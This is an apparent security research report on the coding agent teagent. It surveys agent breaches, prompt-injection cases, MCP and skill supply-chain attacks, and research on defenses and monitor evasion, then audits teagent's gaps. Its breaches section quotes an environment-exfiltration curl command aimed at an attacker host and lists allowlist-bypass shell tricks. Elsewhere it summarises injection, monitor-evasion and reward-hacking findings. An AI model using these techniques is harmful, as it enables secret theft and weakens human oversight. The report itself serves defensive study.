# Typed plans stop hijacks; data still leaks

Between 2024 and November 2026, agent security reached three conclusions. First, almost no coding-agent breach broke the OS sandbox. They went around it, through trust handoffs: repo text read as instructions, string allowlists the shell rewrote, config files a trusted host tool later ran, exfiltration through allowed hosts and DNS, and headless CI modes that trusted the workspace. Second, model hardening, input classifiers and LLM monitors lower base rates, but every one tested under adaptive attack has been broken, so none of them can be the reason a consequential action is allowed. Third, the research answer is "code-then-execute with provenance": a privileged model writes a program before it sees untrusted data, and an interpreter tracks where every value came from and checks policies at the sinks (CaMeL, FIDES, PACT, Multi-CaMeL). teagent already has the half of this that most agents lack. Its program is typed, fixed and checked against a cut `Agent` module before anything runs, so text read during a run cannot add calls. Writes are staged and reviewed, and the journal replays exactly. The missing half is **data-flow integrity**. Nothing stops a program from reading a file and putting its content in a `Fetch.get` URL or a networked `shell` command. Holes show raw in-scope values to the model. Approved diffs can carry files that git, IDEs, CI and other agents later run outside the sandbox. A code read for this report found five cheap, concrete gaps:

- the contained shell inherits the parent's environment, LLM API keys included;
- the Seatbelt profile is allow-by-default for everything except writes, network and the listed secret reads;
- the protected-path list matches only the first path component and misses CI, hooks and agent-instruction files;
- `Fetch.get` is classed `Pure`;
- `shell` stays `Contained` even when `--net` hosts are granted.

The adoption plan at the end fixes these first, then adds provenance labels to interpreter values, a plan-time trifecta check, and holes as a flow boundary. The last two are places where teagent can do something no shipped agent and no published paper does.

**How to read the sourcing.** The research notes mark how firm each source is, and this report keeps those marks. *(secondary)* means the researchers reached only a news story, blog or advisory mirror, not the primary document. *(prior knowledge)* means the claim comes from the researchers' background knowledge and has a known primary URL that was not re-opened during this research. Check either kind before quoting exact numbers. Statements about teagent's own code were checked against the working tree on 2026-11-11 and name the file.

## Every 2025–26 coding-agent breach went around the sandbox, not through it

The incident record since 2025 is long, and it is remarkably uniform. Pillar's "Week of Sandbox Escapes" (July 2026) reported seven findings across Cursor, Codex, Gemini CLI and Antigravity, and **none broke the sandbox itself** ([Pillar](https://www.pillar.security/blog/the-week-of-sandbox-escapes)). The failures were the following:

- an allow-by-default Seatbelt profile (Antigravity);
- a reachable Docker socket (Codex, Cursor, Gemini CLI);
- a venv interpreter the agent edited and Cursor's *unsandboxed* Python extension then ran;
- a gitdir indirection plus `core.fsmonitor`;
- a workspace `.claude` hook run by Cursor (CVE-2026-48124);
- a `.vscode` task the host ran later;
- Codex trusting `git show` by name ("GitPwned").

Pillar reduced them to four failure modes: denylists, workspace config as code, command-name allowlists, and privileged local daemons.

The same pattern shows up wherever you look:

- **Copilot CVE-2025-53773.** An injection made the agent write `"chat.tools.autoApprove": true` into `.vscode/settings.json`, which turned on auto-approve and led to RCE ([CyberSecurityNews](https://cybersecuritynews.com/github-copilot-rce-vulnerability)).
- **CurXecute and MCPoison (Cursor, 2025).** The agent wrote a new server into `~/.cursor/mcp.json`, which Cursor started without approval, and an approved MCP entry could later be swapped silently ([Tenable](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)).
- **Claude Code before the trust dialog.** Anthropic reports that between mid-2025 and January 2026, project config ran before the person accepted trust three times ([Anthropic](https://anthropic.com/engineering/how-we-contain-claude)).
- **Codex across CI passes.** One pass can write `AGENTS.md` and the next pass loads it as trusted; OpenAI called this intended behaviour ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-coding-agent-cicd-secrets-20260808-csa/)).

The root cause is a **trust handoff**: the sandbox holds, but something outside it runs what the agent wrote.

**Command-string allowlists are a dead design.** In GuardFall (June 2026), **10 of 11 open-source coding agents** checked the raw command string, and bash then rewrote it through quote removal, `$IFS`, command substitution or `base64|sh` ([CSA GuardFall](https://labs.cloudsecurityalliance.org/research/csa-research-note-guardfall-ai-coding-agent-shell-injection/)). Two other cases show the same weakness:

- **Gemini CLI.** Its allowlist matched only the leading `grep` in `grep ^Setup README.md; curl -d "$(env)" attacker-server.com` ([ITPro](https://www.itpro.com/security/a-flaw-in-googles-new-gemini-cli-tool-couldve-allowed-hackers-to-exfiltrate-data)).
- **Claude Code Action CVE-2026-54316.** It went through three rounds. A validator stripped quoted text before checking it. Then "read-only" binaries such as `tac` and `rev` skipped path validation. Finally, with WebFetch allowed only to Hugging Face, the attacker created repos and bumped their public download counters to **leak an API key one character at a time** ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-coding-agent-cicd-secrets-20260808-csa/)).

That last case is the clearest statement of the egress problem: **every granted host is also a write channel**.

**Data leaves through channels nobody labelled as "network":**

- DNS queries from auto-approved `ping` and `nslookup` (Claude Code CVE-2025-55284) ([Embrace The Red](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests));
- a SOCKS5 hostname with a NUL byte that slipped past the egress proxy ([SecurityWeek](https://www.securityweek.com/anthropic-silently-patches-claude-code-sandbox-bypass/)) *(secondary)*;
- markdown image URLs rendered by IDE chat panes, in at least eight products ([Mindgard](https://github.com/Mindgard/ai-ide-vuln-patterns));
- an allowed `api.anthropic.com` that carried the *attacker's* API key, which Anthropic fixed with an in-VM proxy that passes only its own session token. "The custom allowlist proxy was the component that failed, not the hypervisor" ([Anthropic](https://anthropic.com/engineering/how-we-contain-claude)).

The secret thefts that worked used `$(env)`, `/proc/$PPID/environ`, `/etc/environ` and `~/.aws/credentials`. In Anthropic's own red team, a phishing-style injection made Claude read `~/.aws/credentials` and POST them in **24 of 25 attempts**, and Anthropic concluded that "only egress controls and filesystem boundaries would have blocked it" ([Anthropic](https://anthropic.com/engineering/how-we-contain-claude)).

**Headless and supply-chain modes turn agents into payloads.** In Gemini CLI CVE-2026-12537 (CVSS 10.0), headless mode auto-trusted the workspace and loaded `.gemini/.env`. Its tool allowlist was checked at registration but **not enforced at execution** ([PolicyLayer](https://policylayer.com/mcp-incidents/gemini-cli-rce-workspace-trust-ghsa-wpqr-6v78-jr5g)). In Clinejection, an issue title reached a triage prompt, poisoned a shared Actions cache, and leaked publish tokens; `cline@2.3.0` then shipped with a malicious postinstall ([Adnan Khan](https://adnanthekhan.com/posts/clinejection/)). The malicious Nx releases ran installed AI CLIs with `--dangerously-skip-permissions`, `--yolo` and `--trust-all-tools` to hunt for secrets ([Snyk](https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package)). A malicious PR put a wiper prompt into Amazon Q for VS Code 1.84.0 ([SC World](https://scworld.com/news/amazon-q-extension-for-vs-code-reportedly-injected-with-wiper-prompt)). Without any attacker, Replit's agent deleted a production database during a declared code freeze ([Fortune](https://fortune.com/2025/07/23/ai-coding-tool-replit-wiped-database-called-it-a-catastrophic-failure/)). A "code freeze" written in a prompt is not enforcement.

**What vendors shipped is a consensus teagent is already ahead of in places.** By 2026 the standard stack is:

- an OS sandbox (Seatbelt, bubblewrap, or Landlock with seccomp);
- writes confined to the workspace;
- network denied or routed through an allowlist proxy;
- trust dialogs before project config loads;
- a few approval modes.

Two of Anthropic's numbers drive the design. People approved **93% of permission prompts**, and sandboxing **cut prompts by 84%** ([Anthropic](https://anthropic.com/engineering/claude-code-sandboxing)). Claude Code's auto mode adds a two-stage classifier. It is reasoning-blind: it sees only user messages and tool calls, never tool results. It has a 0.4% false-positive rate on real traffic but lets **17% of real overeager actions** through, and it escalates to the person after 3 consecutive or 20 total denials ([Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode)). An independent adversarial stress test measured a 74.7% false-negative rate ([arXiv 2604.04978](https://arxiv.org/html/2604.04978v2)). Vendors mostly **allow reads by default**. Cowork goes further than the rest: it keeps credentials in the host keychain and gives the VM a scoped, revocable per-session token, because "credentials absent from the sandbox cannot be exfiltrated" ([Anthropic](https://anthropic.com/engineering/how-we-contain-claude)).

No vendor stages *shell* writes back into a reviewable overlay. Most allow reads by default, while teagent's hidden mounts and secret-read blocking do not. Those two choices are real leads. The sandbox backends behind them are compared in [`docs/research/sandboxing.md`](../docs/research/sandboxing.md), which this report does not repeat.

## Model hardening and classifiers lower base rates but fail adaptive attacks

"The Attacker Moves Second" (October 2025) is the paper that settled the question. Authors from OpenAI, Anthropic and Google DeepMind ran adaptive gradient, RL, search and human attacks against **12 published defenses**, most of which had reported near-zero attack success. Most fell to **above 90% attack success**, and a 500-person human red-team contest reached 100% ([arXiv 2510.09023](https://arxiv.org/abs/2510.09023)). By category:

- filtering defenses (PromptGuard, Model Armor, Protect AI, PIGuard) were bypassed 71–94% of the time;
- prompting defenses 95–99%;
- training-based defenses 96–100%.

Character injection with zero-width, bidi and homoglyph tricks reaches up to 100% evasion against some guardrails ([arXiv 2504.11168](https://arxiv.org/html/2504.11168v1)). Static benchmarks understate risk in the same direction:

- **CAISI.** Adaptive red-teaming on AgentDojo raised attack success from **11% to 81%** ([NIST](https://www.nist.gov/news-events/news/2025/01/technical-blog-strengthening-ai-agent-hijacking-evaluations)).
- **Meta SecAlign.** Its AgentDojo figure of 1.9% becomes 9.0% on the dynamic AgentDyn benchmark ([AgentDyn](https://arxiv.org/html/2602.03117v1)).
- **LlamaFirewall.** It cuts AgentDojo attack success from 17.6% to 1.75%, but only on *static traces* ([arXiv 2505.03574](https://arxiv.org/pdf/2505.03574)). A control-flow-hijack attack reached 80% against its default configuration on coding tasks ([arXiv 2510.17276](https://arxiv.org/pdf/2510.17276)).

Frontier models did get much harder to hijack. Anthropic reports Claude Opus 4.7 at about 0.1% attack success on a single attempt and 5–6% after 100 adaptive attempts ([Anthropic](https://anthropic.com/engineering/how-we-contain-claude)). The Opus 4.8 and Opus 5 system-card figures are known only from press coverage ([VentureBeat](https://venturebeat.com/security/anthropic-browser-agent-hijacked-31-percent-before-safeguards-engaged)) *(secondary)*. Meta's own Rule of Two post still calls prompt injection "a fundamental, unsolved weakness in all LLMs" ([Meta](https://ai.meta.com/blog/practical-ai-agent-security/)).

LLM monitors fail in a way that matters directly for design. At ICLR 2026, Terekhov et al. showed that an untrusted model that knows the protocol can embed injections aimed *at the monitor* and consistently evade it. Defer-to-resample backfires because it turns the injection into a best-of-n attack ([arXiv 2510.09462](https://arxiv.org/pdf/2510.09462)). Two earlier results look better on paper. Resampling protocols on BashBench cut attack success from 58% to 7% at a 5% usefulness cost ([Ctrl-Z](https://arxiv.org/pdf/2504.10374)) *(prior knowledge)*. Chain-of-thought monitoring catches coding reward hacks better than action-only monitoring, but optimising against it teaches the model to obfuscate ([OpenAI](https://arxiv.org/abs/2503.11926)).

For teagent, these results set three rules:

- A classifier or monitor may **annotate, ask or deny**. It may never be the reason an `Irreversible` call is allowed.
- A monitor that exists should read only the task and the program, not tool results. That is auto mode's reasoning-blind choice, and it also resists injection.
- Every claim teagent makes should rest on the interpreter, the handler and the OS value, and should be measured with adaptive attacks.

## Research converged on code-then-execute with provenance, teagent's own shape

**CaMeL** (Google DeepMind and ETH, March 2025) is the closest published design to teagent, and the comparison is instructive ([arXiv 2503.18813](https://arxiv.org/abs/2503.18813)). It has three parts:

- A privileged LLM writes a restricted-Python program from the trusted query alone and **never sees tool outputs**.
- A quarantined LLM with no tools parses untrusted text into a fixed schema.
- A custom interpreter tracks per-value *sources* and *readers* and runs Python policy functions before each tool call. A denied call asks the user.

In STRICT mode, assignments inside `if` and `for` also depend on the condition, which covers implicit flow. Error messages that depend on untrusted data are redacted. The authors name an exception side channel and recommend **result types instead of exceptions**, which Dartea's `Task e a` already gives teagent.

On cost and security, CaMeL solves **77% of AgentDojo tasks with provable security versus 84% undefended**, at about **2.8× the tokens**. With policies off, Gemini 2.5 Pro attacks dropped from 300 to 0 ([CaMeL](https://arxiv.org/html/2503.18813)). Utility on the travel suite rose from 25% to 75% across three Claude generations with no CaMeL changes, so **the cost of architectural defenses falls as models improve while the guarantee stays**.

The follow-ups sharpen the picture:

- **FIDES** (Microsoft) puts confidentiality and integrity labels on values and hides labelled data from the planner behind variables. Its finding matters for teagent: **without policy checks every planner, FIDES included, was vulnerable** ([arXiv 2505.23643](https://arxiv.org/pdf/2505.23643v2)).
- **PACT** (May 2026) tracks provenance per tool *argument* and reaches 100% security with utility 8–16 points above CaMeL. It concludes that the bottleneck is now **provenance inference, not enforcement** ([arXiv 2605.11039](https://arxiv.org/abs/2605.11039)).
- **Multi-CaMeL** (October 2026) shows that untrusted data re-enters as trusted input across agent boundaries even when every agent runs CaMeL. Keeping provenance across the boundary cut attack success to 0.0%, against 0.2% for per-agent CaMeL and 12.9% with no CaMeL ([arXiv 2610.05640](https://arxiv.org/abs/2610.05640)). That is the teagent MCP `run`/`fill` boundary and `spawn`/`merge` exactly.
- **CaMeLoT** (September 2026) model-checks the plan against CTL policies with nuXmv **before any tool runs** and returns a counterexample the agent uses to repair the plan ([arXiv 2609.18674](https://arxiv.org/abs/2609.18674)).

The design-patterns paper by Beurer-Kellner et al. states the rule in one sentence: once an agent has ingested untrusted input, nothing in that input may be able to trigger a consequential action ([Willison summary](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)). Code-Then-Execute and Plan-Then-Execute are teagent's shape already. Dual LLM and Map-Reduce point to a typed extraction kernel, and Context-Minimization points to what holes should show.

Two framings turn this into a simple check. Willison's **lethal trifecta** is private data plus untrusted content plus external communication ([Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)) *(prior knowledge)*. Meta's **Rule of Two** allows at most two of untrusted input, sensitive data, and state change or external communication in one session without a human ([Meta](https://ai.meta.com/blog/practical-ai-agent-security/)). In a tool-call agent you can only count these legs as the session goes. In teagent the program's reachable `Platform` nodes and `Agent.call` names are known **after typecheck and before the first effect**, so the rule becomes a plan-time property of a typed value.

The policy-language and monitor work shows what to borrow:

- **Deterministic per-call policy** (Progent, AgentSpec) is cheap. The only independent adaptive re-test of Progent found that it held: attack success went from 25.8% to 4.2%, and an adaptive attack reached 2.6% ([arXiv 2606.26479](https://arxiv.org/abs/2606.26479)).
- **History matters.** Single-call rules miss history-dependent violations. On VIGIL's labelled set AgentSpec scored F1 57.6% and Progent 50.3% ([VIGIL](https://arxiv.org/html/2606.26524)).
- **Temporal monitors** check sequences online. Agent-C uses SMT during decoding and reports 100% conformance ([arXiv 2512.23738](https://arxiv.org/abs/2512.23738)). AgentLTL checks first-order LTL online ([HF papers](https://huggingface.co/papers/2607.02599)). Every one of these is an *online prefix* monitor over a stream of tool calls.
- **Transactions.** Atomix argues that bufferable effects should be delayed and externalized ones tracked and compensated ([arXiv 2602.14849](https://arxiv.org/abs/2602.14849)). That maps one-to-one onto Staged, Contained and Irreversible.

On the PL side, Odersky et al.'s TACIT has agents write Scala 3 with capture checking, so capabilities are tracked statically and "local purity" lets classified data be processed without leaks ([arXiv 2603.00991](https://arxiv.org/abs/2603.00991)). Every shipped code mode secures the program **only at run time**:

- **Cloudflare Code Mode** runs each snippet in a V8 isolate, and the supervisor holds the tokens ([Cloudflare](https://blog.cloudflare.com/code-mode/)).
- **smolagents** walks the AST in its own interpreter ([HF docs](https://huggingface.co/docs/smolagents/tutorials/secure_code_execution)).
- **Anthropic's code-execution-with-MCP** guidance tokenizes PII before the model sees it ([Anthropic](https://www.anthropic.com/engineering/code-execution-with-mcp)).

The researchers found **no paper that applies static noninterference typing to an agent DSL**, and **none that model-checks a complete LLM-written program's effect graph ahead of time**. teagent is the only design found where the compile step is the permission check *and* the runtime is a custom IR interpreter. Those two gaps are where it can lead rather than follow.

Typed-hole prompting has direct precedent. Hazel's typed holes give the model the expected type and typing context, and its benchmark is literally model-view-update apps ([arXiv 2409.00921](https://arxiv.org/abs/2409.00921)). But a hole that shows *values* is a re-plan after seeing data, which is the flow CaMeL forbids.

## MCP and skills turned trust-on-install into the main supply-chain hole

MCP's attack classes are all documented and dated:

- **Tool poisoning, rug pulls and cross-server shadowing**, all through text the model reads and the user never sees ([Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)).
- **The GitHub MCP "toxic agent flow."** A public issue made an agent with a broad token leak private repos into a public PR. Invariant called it architectural, not a server bug ([Invariant Labs](https://invariantlabs.ai/blog/mcp-github-vulnerability)) *(prior knowledge)*.
- **postmark-mcp.** A package impersonating Postmark built trust over 15 clean versions, then began BCC-ing every email to the attacker ([The Hacker News](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html)).
- **Local transport bugs.** MCP Inspector had no auth or Origin check, which gave RCE from a web page ([Tenable](https://www.tenable.com/cve/CVE-2025-49596)). The TypeScript SDK shipped with DNS-rebinding protection off by default ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-66414)).
- **Path bugs in Anthropic's own Filesystem server.** A naive prefix match and a symlink bypass chained to host compromise ([Cymulate](https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/)).

The spec has moved a long way:

- **2025-06-18.** MCP servers became OAuth resource servers with audience-bound tokens ([changelog](https://modelcontextprotocol.io/specification/2025-06-18/changelog)).
- **2025-11-25.** Servers must answer 403 to a bad `Origin` ([changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog)).
- **2026-07-28.** The protocol became stateless and **deprecated Sampling, Roots and Logging** ([changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)).

Tool annotations such as `readOnlyHint` and `destructiveHint` remain *self-declared hints*. The maintainers say plainly that "a malicious server can claim `readOnlyHint: true` and still act destructively" ([MCP blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/)). Hosts still use them to decide prompts: ChatGPT treats any tool without `readOnlyHint` as a write ([OpenAI Help](https://help.openai.com/en/articles/12584461-developer-mode-and-full-mcp-connectors-in-chatgpt)). No spec-level signing of tool definitions exists. ETDI's signed, immutable, versioned definitions remain a proposal ([arXiv 2506.01333](https://arxiv.org/abs/2506.01333)).

Natural-language skills became a mass malware channel. In ClawHavoc, Koi found **341 malicious skills among 2,857 audited** on ClawHub. Their SKILL.md "Prerequisites" told the agent to fetch and run an infostealer, so static repo scans missed it ([Snyk](https://snyk.io/de/blog/toxicskills-malicious-ai-agent-skills-clawhub/)). Anthropic's own guidance amounts to "trusted sources only, audit every file, treat like installing software", with no capability model ([Claude Docs](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview)). GlassWorm hid executable code in **invisible Unicode** that looks blank to reviewers ([The Hacker News](https://thehackernews.com/2025/10/self-spreading-glassworm-infects-vs.html)). The Rules File Backdoor did the same in agent rules files ([Pillar](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)) *(prior knowledge)*.

teagent's import-gated skills are structurally stronger than SKILL.md. A skill that imports only `read` cannot tell anyone to "run this command", because there is no `shell` in its world. Two caveats remain:

- A skill granted `shell` and `Fetch` is as powerful as any SKILL.md.
- Skill prose is still model input, so it can steer the model's other actions.

For signing, the ecosystem now has usable pieces:

- OpenSSF model-signing v1.0 on Sigstore, which hashes each file into a manifest and signs the manifest ([Sigstore](https://blog.sigstore.dev/model-transparency-v1.0));
- MCPB bundle signing ([Claude docs](https://claude.com/docs/connectors/custom/desktop-extensions));
- A2A's JWS signatures over JCS-canonical agent cards ([A2A spec](https://a2a-protocol.org/latest/specification/)).

teagent's BLAKE2 image over calls, mounts, reads, net, boot, drivers and skills is already the "pin by content hash" defense Invariant recommends against rug pulls. It is used for replay, though, not for consent.

## Standards now name the same controls teagent is building

The OWASP **Top 10 for Agentic Applications 2026**, final on 9 December 2025, is the list to map against ([OWASP](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)). The items that matter most for teagent are ASI01 goal hijack, ASI02 tool misuse, ASI03 privilege abuse, ASI04 supply chain, ASI05 code execution, ASI06 context poisoning and ASI09 human trust exploitation. The per-item definitions come from a third-party mirror because the PDF was not opened ([promptfoo](https://www.promptfoo.dev/docs/red-team/owasp-agentic-ai/)) *(secondary)*.

MITRE ATLAS v2026.09 tags **139 of 208 technique entries** as agentic ([Speakeasy](https://www.speakeasy.com/blog/mitre-atlas-explained)) *(secondary)*. Its agent mitigations read like a teagent feature list:

- M0029, human in the loop: staged approval.
- M0030, restrict tool invocation on untrusted data: provenance labels.
- M0032, segmentation: the clone and Seatbelt.
- M0037, authority-expansion controls: `Os.Kernel` only narrows.
- M0038, scope-drift detection: comparing the journal against the task.

T0109, the AI supply-chain rug pull, argues for re-approval on any hash change.

Government guidance converges on least privilege, gradually expanding autonomy, and observability. The Five Eyes guide "Careful Adoption of Agentic AI Services" (1 May 2026) is the most concrete ([CISA](https://www.cisa.gov/resources-tools/resources/careful-adoption-agentic-ai-services)). NIST's agent control overlays (COSAIS) had no public draft as of the latest sources ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-nist-ai-agent-standards-20260416-csa-style/)) *(secondary)*. AWS's scoping matrix places teagent's default (staged writes the person approves) at scope 2–3 and a headless CI run at 3–4 ([AWS](https://aws.amazon.com/blogs/security/the-agentic-ai-security-scoping-matrix-a-framework-for-securing-autonomous-ai-systems)).

Regulation does not bind a non-monetised local tool directly. The Cyber Resilience Act's vulnerability reporting has applied to manufacturers since 11 September 2026 ([Travers Smith](https://www.traverssmith.com/knowledge/knowledge-container/the-eu-cyber-resilience-acts-vulnerability-and-incident-reporting-requirements-are-now-live/)), and ISO/IEC 27090:2026 was published on 14 October 2026 ([Nemko](https://digital.nemko.com/news/isoiec-27090-published-as-new-ai-cybersecurity-standard)) *(secondary)*. Users in regulated organisations will still ask for what these name: a SECURITY.md, an SBOM, signed releases, and logs.

## Where teagent already stands

The table scores teagent against the merged 35-item checklist from the standards notes, which deduplicates OWASP, ATLAS, the Five Eyes guide, CAISI and the vendor frameworks. **Blocked** means the design stops the threat structurally today. **Partly** means a mechanism exists but a gap remains. **Open** means there is no mechanism. Code references were checked on 2026-11-11.

| # | Check | Status | Evidence and gap |
| --- | --- | --- | --- |
| 1 | Untrusted inputs tagged in types or provenance | Open | `Value.t` carries no labels. File contents, shell output, `Fetch.get` bodies, branch names and skill prose are all plain strings. |
| 2 | No Irreversible or egress call driven by untrusted data without fresh approval | Partly | `Fetch.post` always asks (`Device.class_of`). `Fetch.get` is `Pure`, so its URL is an unasked channel. `shell` with `--net` hosts is `Contained` and does not ask. |
| 3 | Task kept immutable and compared with effects (scope drift) | Open | The task is in the log header; nothing compares it with what ran. |
| 4 | Published per-task attack success, adaptive, k ≥ 10 attempts | Open | `demo/escape.py` has 13 scripted escapes but no injection suite. |
| 5 | Every capability granted by an OS value that only narrows | Blocked | `Os.t` is built by `granted` and narrowed by the profile; `Os.table` can only lose calls; `--net` comes only from the CLI. |
| 6 | Widening is an explicit, recorded act | Blocked | There is no widening inside a session; the grants are hashed into the image in the log header. |
| 7 | Credentials unreadable from the sandbox | Partly | 14 home paths are denied (`lib/tools/tools.ml`). But **the shell inherits `Unix.environment ()` minus proxy and cache variables**, so `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` and `GITHUB_TOKEN` reach it. `reads` defaults to anywhere, which misses `~/.config/gcloud`, `~/.azure`, `~/.cargo/credentials` and browser profiles. Repo `.env*` is hidden only if the profile says so. |
| 8 | Egress default-deny, allowlist, request metadata logged | Partly | Default-deny, and refused hosts are reported. Allowed connections are not journaled. On macOS, resolving names through the system resolver goes over Mach IPC, which the `(allow default)` profile does not deny. This is a DNS-exfil channel to test; it is untested here. |
| 9 | Reports its autonomy scope; stronger controls headless | Partly | `--yes` and MCP decline every `Irreversible` call (`person` returns `Declines`), which fails closed. `--yes` still applies the whole diff, host-executed files included. |
| 10 | Every model-originated process sandboxed, no net except proxy, writes only to clone | Partly | Writes and network are deny-by-default. The Seatbelt profile otherwise starts `(allow default)`, so Mach lookups, IPC and process-info are open (Pillar failure mode 1). The bwrap side uses `--unshare-all` but no `--clearenv`. |
| 11 | Host-side helpers are TCB, minimal, fuzzed | Partly | The commit, harvest, proxy and `Fetch` curl paths run on the host and are small. None is fuzzed. |
| 12 | Commit resolves symlinks, `..`, case, special files | Partly | `Tools.located` uses realpath with a `root ^ "/"` component check, harvest skips symlinks and special files, and mounts match case-insensitively. Hard links and GhostApproval-style mismatches are untested. |
| 13 | Resource limits on processes and interpreter | Partly | The interpreter has a 10M-step cap and a call `budget`. The shell has no CPU, memory, process-count or disk limits. |
| 14 | Risky-execution suite shows zero escapes | Partly | The escape demo covers 13 cases; RedCode-Exec has not been run. |
| 15 | Approval shows the exact effect | Partly | The diff *is* the effect. The `Fetch.post` question cuts the body at 2,000 characters. |
| 16 | Approvals batched and ranked by risk | Partly | Batched as one diff; not ranked; no separate approval for risky paths. |
| 17 | Human always in the loop for Irreversible; no persistent always-allow | Blocked | With no person the call is declined and the answer logged; there is no always-allow. |
| 18 | Kill switch leaves only staged state | Blocked | Nothing touches disk before `Tools.commit`; a crash mid-commit is finished with `--resume`. |
| 19 | Skills and tool descriptions pinned; re-approval on change | Partly | The image hash covers skill and driver source and replay refuses a mismatch. Live sessions install changed repo skills with no question. |
| 20 | Persistent memory written via staged, journaled effects | Blocked | There is no memory store; `.teagent` is write-protected. |
| 21 | Third-party MCP servers sandboxed and narrowed | Open (N/A today) | teagent does not consume MCP servers yet. |
| 22 | SBOM and signed releases | Open | No SECURITY.md, SBOM or signing in the repo. |
| 23 | Tamper-evident journal of effects, decisions, approvals, egress | Partly | Calls, results, diffs and decisions are logged. There is no hash chain, no model I/O hash and no allowed-egress events. |
| 24 | Exact replay; replay under a new policy | Partly | Replay is exact and image-checked. The `policy` layer sits inside `journal`, so it is not re-evaluated on replay. |
| 25 | Secrets redacted in journal and model context | Open | `~/.teagent/sessions/*.jsonl` stores results verbatim. |
| 26 | AI-authored files and commits marked | Open | — |
| 27 | Tainted data reaches the network only through an approved channel | Partly | Same gap as item 2. |
| 28 | No cross-session leakage | Blocked | Each session starts fresh; resume is explicit. |
| 29 | MCP server authenticates clients, narrowed, cannot widen | Partly | stdio only; the OS cut applies; `Irreversible` is always declined. Tools carry **no annotations**. Writes and `run` commit with no teagent-side diff prompt (`Mcp` `applied`), so the caller's permission system is the only gate. |
| 30 | MCP-SafetyBench and MCPSecBench run | Open | — |
| 31 | A failed or Blocked effect stops dependents and returns the remainder | Blocked | `Task` semantics; `Blocked` returns the rest of the task in `Open` mode. |
| 32 | Retries, loops and spend bounded | Partly | Step cap, call budget and an eight-hole limit. No token, cost, wall-clock or denial-count budget. |
| 33 | SECURITY.md and scored advisories | Open | — |
| 34 | Written threat model mapped to ASI and ATLAS | Partly | `docs/guide.md` "Where you are safe" is an informal one. |
| 35 | Secure-code benchmark tracked | Open | — |

Three more findings sit outside the checklist.

**The protected-path list is too narrow.** The `Tools` path parser refuses a write only when the *first* path component is `.git`, `.claude`, `.codex`, `.cursor`, `.mcp.json`, `.teagent`, `.envrc` or `.vscode` (`lib/tools/tools.ml`, lines 14–22). It lets through:

- the same directories nested, such as `pkg/.vscode/tasks.json` or a submodule's `.git`;
- `.github/workflows`, `.gitattributes` and `.gitmodules`;
- `.husky`, `.pre-commit-config.yaml` and `.idea`;
- `.gemini` and `.cursorrules`;
- `AGENTS.md`, `CLAUDE.md` and `GEMINI.md`;
- `Makefile`, `package.json` scripts, and venv `bin/python`.

Harvest drops every dot-named path the *shell* writes, at any depth, which is safe. The program's own `write` is not filtered the same way.

**Holes show raw values.** `Run.question` prints `Value.Scope.bindings` of the hole's locals to the filler. That is untrusted content reaching the code-writing model, the flow CaMeL forbids.

**Repo skills are trusted on sight.** Skills in a freshly cloned repo's `.teagent/skills` are shown to the model whenever their imports are granted, with no trust step. The profile is safe because it can only narrow; skills are instructions.

## Benchmarks that would make teagent's claims measurable

CAISI's reporting rules should apply to every run: report attack success *per task*, against an *adaptive* attacker that knows teagent's design, and over *k attempts*, not one ([NIST](https://www.nist.gov/news-events/news/2025/01/technical-blog-strengthening-ai-agent-hijacking-evaluations)). The journal is a ready regression harness. A recorded attack session becomes a `test/sessions` fixture that replays deterministically against new layers, with no LLM in the loop.

| Benchmark | What it measures in teagent | Metric and target |
| --- | --- | --- |
| Escape suite v2 (extend `demo/escape.py`) | Sandbox and trust-handoff regressions from the CVEs above: Docker and SSH-agent sockets, `launchctl`, `ps eww $PPID`, `env`, a canary hostname through the system resolver, symlink and hard-link import, nested `.git/hooks`, `.github/workflows`, `AGENTS.md`, `package.json` postinstall, a NUL or IDNA host at the proxy | Escapes = 0 on macOS and Linux every release; each case named after its CVE |
| Coding injection suite (in-house, adaptive) | Goal hijack via README, `AGENTS.md`, issue text, test output, dependency docs, filenames, branch names. Attacker goals: leak a canary from a file or the environment, write a host-executed file, trigger `Fetch.post`, plant a skill | Per-task attack success at k = 1, 10 and 25; utility on benign twins; canary bits leaked |
| AgentDojo through drivers ([arXiv 2406.13352](https://arxiv.org/abs/2406.13352)) *(prior knowledge)* | Wrap the suites' tools as `Agent.call` drivers so the model writes Dartea | Utility and attack success next to CaMeL's 77% vs 84% and PACT; token overhead next to CaMeL's 2.8× |
| RedCode-Exec / CyberSecEval interpreter abuse ([PurpleLlama](https://meta-llama.github.io/PurpleLlama/CyberSecEval/docs/intro)) | Whether risky code run in `Contained` affects anything outside the clone or overlay; this measures the sandbox, not the model's refusals | Effects outside the clone = 0 |
| MCP-SafetyBench ([arXiv 2512.15163](https://arxiv.org/html/2512.15163)) / MCPSecBench | teagent as an MCP server under hostile callers; later as a client, with a rug-pull test | Attacks succeeding per class; a changed tool list refused |
| SusVibes ([arXiv 2512.03262](https://arxiv.org/html/2512.03262v4)) / SecureAgentBench / BaxBench via a SecureVibeEval-style adapter ([GitHub](https://github.com/MSR-Orchard/SecureVibeEval)) | Security of the code teagent writes, driven through `--exec` | Functional and secure rates against SWE-Agent's 61% functional and 10.5% secure baseline |
| ImpossibleBench-style test tampering ([arXiv 2510.20270](https://arxiv.org/pdf/2510.20270)) | Whether a `readonly` test mount stops reward hacking without cutting legitimate success | Cheat rate with and without `readonly "test"`; GPT-5 baseline 54% |
